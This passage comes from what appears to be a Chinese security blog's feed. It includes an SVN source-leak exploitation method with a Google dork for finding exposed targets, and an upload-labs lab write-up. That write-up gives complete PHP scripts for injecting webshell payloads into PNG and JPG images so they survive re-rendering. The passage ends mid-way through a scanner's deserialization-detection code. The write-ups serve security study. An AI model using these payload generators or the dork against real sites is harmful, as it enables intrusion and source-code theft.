<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://paper.seebug.org/729/">sqlmap 检测剖析</a></p>
</li>
</ul>
<blockquote>
<p>根据这篇文章提出的关键概念点,可以比较好的作为了解sqlmap的路径。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://zhuanlan.zhihu.com/p/45291193">sqlmap 内核分析 III: 核心逻辑</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>Svn源码泄露exploit</title>
    <url>/2019/50672.html</url>
    <content><![CDATA[<h1>寻找测试目标:</h1>
<p>google hack: <code>Index of /.svn</code></p>
<h1>svnExploit工作原理</h1>
<h2 id="判断svn版本号">判断svn版本号</h2>
<p>通过根目录下的entries文件来判断</p>
<p>版本号&gt;1.7的话,</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73a42af8.jpg" alt="" /></p>
<p>版本号&lt;1.7的话,</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73af3f2b.jpg" alt="" /></p>
<h2 id="版本号小于1-7的情况">版本号小于1.7的情况:</h2>
<h3 id="解析元数据-2">解析元数据:</h3>
<p><code>.svn/entries</code> 包含了项目的文件和文件夹列表。</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73ba78ca.jpg" alt="" /></p>
<p>可以解析这个文件来获取文件列表<code>file_list</code>和路径列表<code>dir_list</code>。</p>
<h3 id="循环解析元数据">循环解析元数据:</h3>
<p>上面收集了文件夹列表,进入每个文件夹继续解析元数据<code>entries</code>文件</p>
<p>现在有了整个项目结构了</p>
<h3 id="下载文件-2">下载文件</h3>
<p>.SVN-BASE files store a base copy of a file</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73c5c73f.jpg" alt="" /></p>
<p>在每个文件后面加上<code>.svn-base</code>,然后请求对应的url就可以下载文件</p>
<hr />
<h2 id="版本号大于1-7的情况">版本号大于1.7的情况:</h2>
<h3 id="下载数据库文件">下载数据库文件</h3>
<p>下载<code>/.svn/wc.db</code></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73d53d53.jpg" alt="" /></p>
<h3 id="连接数据库文件">连接数据库文件</h3>
<p>从<code>Node</code>表中查询出</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>相对路径</p>
</li>
<li class="lvl-2">
<p>文件类型</p>
</li>
<li class="lvl-2">
<p>校验值</p>
</li>
</ul>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73e53b2e.jpg" alt="" /></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73f61b38.jpg" alt="" /></p>
<h3 id="下载文件-3">下载文件</h3>
<p>如果一个文件的<code>checksum</code>为 0a781ca8d6e963590f208608e3d80f52307a116d</p>
<p>那么其对应的url则为: domain/.svn/pristine/<code>checksum前两位数</code>/<code>checksum</code>加上.svn-base</p>
<p>即<code>https://domain/.svn/pristine/0a/0a781ca8d6e963590f208608e3d80f52307a116d.svn-base</code></p>
<hr />
<h1>题外话:</h1>
<p>在测试<a href="https://github.com/admintony/svnExploit">svnExploit</a>的时候,发现有点小问题.提了个<a href="https://github.com/admintony/svnExploit/pull/1">pr</a>.</p>
<p>优化:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>1.thread-unsafe的Generator改用thread-safe的queue</p>
</li>
<li class="lvl-2">
<p>2.兼容Py2</p>
</li>
</ul>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/admintony/svnExploit">svnExploit</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.rapid7.com/db/vulnerabilities/spider-svn-entries-disclosure">Subversion entries file information disclosure</a></p>
</li>
<li class="lvl-2">
<p><a href="https://stackoverflow.com/questions/20043472/multithreading-why-arent-generators-thread-safe-what-happens-when-it-is-share">multithreading: Why aren’t generators thread-safe? What happens when it is shared among threads?</a></p>
</li>
<li class="lvl-2">
<p><a href="https://stackoverflow.com/questions/20042534/python-why-different-threads-get-their-own-series-of-values-from-one-generator">Python: Why different threads get their own series of values from one generator?</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>uploadlab-二次渲染绕过</title>
    <url>/2021/1606.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>在做这个靶场的时候，发现pass17这一关还有点意思。<br />
<a href="https://github.com/c0ny1/upload-labs/blob/master/Pass-17/index.php">https://github.com/c0ny1/upload-labs/blob/master/Pass-17/index.php</a></p>
<p>主要考察的点是图片被渲染后，怎么再次在图片注入webshell payload.</p>
<p>想要绕过二次渲染的话，就要 <strong>搞清楚二次渲染后，源文件哪些区域不会被修改或压缩。</strong> 这里因为gif、jpg、png三种不同图片文件的文件格式不同，所以图片马的构造方法也不同。</p>
<hr />
<h1>gif上传:</h1>
<h2 id="绕过方法">绕过方法:</h2>
<p>gif二次渲染绕过说是最简单的。</p>
<p>将源文件和二次渲染过的文件进行比较，找出源文件中没有被修改的那段区域，在那段区域写入php代码即可。</p>
<p>用比较工具，可以迅速找到两者匹配的地方。在匹配处写入php代码即可。</p>
<h2 id="过程">过程:</h2>
<p>在gif尾部加上php的payload,上传经过渲染后,payload不见了。</p>
<p>上传前:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306112121.png" alt="20210306112121" /></p>
<p>上传后:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306112202.png" alt="20210306112202" /></p>
<p>用对比工具找到匹配的地方，然后用<code>winhex</code>写入payload即可</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306115049.png" alt="20210306115049" /></p>
<p>结合文件包含试试:<br />
<a href="http://localhost/include.php?file=./upload/14830.gif">http://localhost/include.php?file=./upload/14830.gif</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306114904.png" alt="20210306114904" /></p>
<hr />
<h1>png上传:</h1>
<p>直接记个方法，将php代码写入IDAT数据块。用别人的脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>生成的1.png如下图</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306153551.png" alt="20210306153551" /></p>
<p>后续利用暂时没搞出来。</p>
<hr />
<h1>jpg上传:</h1>
<p>别人的脚本<br />
jpg马生成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用方法：</p>
<ol>
<li class="lvl-3">
<p>先将一张正常的jpg图片上传，上传后将服务器存储的二次渲染的图片保存下来。</p>
</li>
<li class="lvl-3">
<p>将保存下来经过服务器二次渲染的那张jpg图片，用此脚本进行处理生成payload.jpg</p>
</li>
<li class="lvl-3">
<p>然后再上传payload.jpg</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php.exe jpg_payload.php 2013.jpg</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306161437.png" alt="20210306161437" /></p>
<p>换了几个图片,还是无法正常解析。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306161607.png" alt="20210306161607" /></p>
<hr />
<h1>图片马结合文件包含漏洞:</h1>
<p><a href="https://blog.csdn.net/qq_42311391/article/details/89477993">关于图片马的正确用法</a></p>
<p>文件包含漏洞简单说就是，在这个include.php中需要引用其他应用程序，php中应用程序文件是.php也就是说，他本来想引用一个php文件，但是漏洞就是，他不会识别什么是php文件，<strong>只要是他引用的，他都当php来解析</strong>，所以如果他引用的是jpg，但是jpg中有图片马，那么他就相当于引用了图片马，同样的道理还会有zip马等等</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://choge.top/2020/02/24/upload-labs%E8%AE%B0%E5%BD%95/">upload-labs记录</a></p>
</li>
<li class="lvl-2">
<p><a href="https://xz.aliyun.com/t/2657">upload-labs之pass 16详细分析</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>w13scan-扫描插件总结-PerFile</title>
    <url>/2019/24549.html</url>
    <content><![CDATA[<h1>整体流程图</h1>
<p><img src="https://i.loli.net/2019/12/17/b27hPyBAzm3vN5g.png" alt="W13SCAN-DESIGN.jpg" /></p>
<hr />
<h2 id="PerFile-每个文件">PerFile (每个文件)</h2>
<h3 id="序列化参数分析">序列化参数分析</h3>
<blockquote>
<p>如果参数中包含反序列化的参数就会被识别出来，反序列化的参数如果没有做好过滤会有很大危害。</p>
</blockquote>
<p>里面有3个函数:</p>
<ol>
<li class="lvl-3">
<p><code>isJavaObjectDeserialization()</code></p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关键代码</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">bytes</span>(ret).startswith(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;ac ed 00 05&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>在识别Java序列化特征时，人们经常说要寻找4字节的特征序列：<code>0xAC ED 00 05</code>，事实上某些IDS规则也是根据这个特征来识别此类攻击。</p>
</blockquote>
<ol start="2">
<li class="lvl-3">
<p><code>isPHPObjectDeserialization()</code></p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关键代码</span></span><br><span class="line"><span class="keyword">if</span> value.startswith(<span class="string">&quot;O:&quot;</span>) <span class="keyword">or</span> value.startswith(<span class="string">&quot;a:&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">&#x27;^[O]:\d+:&quot;[^&quot;]+&quot;:\d+:&#123;.*&#125;&#x27;</span>, value) <span class="keyword">or</span> re.match(<span class="string">&#x27;^a:\d+:&#123;(s:\d:&quot;[^&quot;]+&quot;;|i:\d+;).*&#125;&#x27;</span>, value):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">elif</span> (value.startswith(<span class="string">&quot;Tz&quot;</span>) <span class="keyword">or</span> value.startswith(<span class="string">&quot;YT&quot;</span>)) <span class="keyword">and</span> is_base64(value):</span><br><span class="line">    ret = is_base64(value)</span><br><span class="line">    <span class="keyword">if</span> re.match(<span 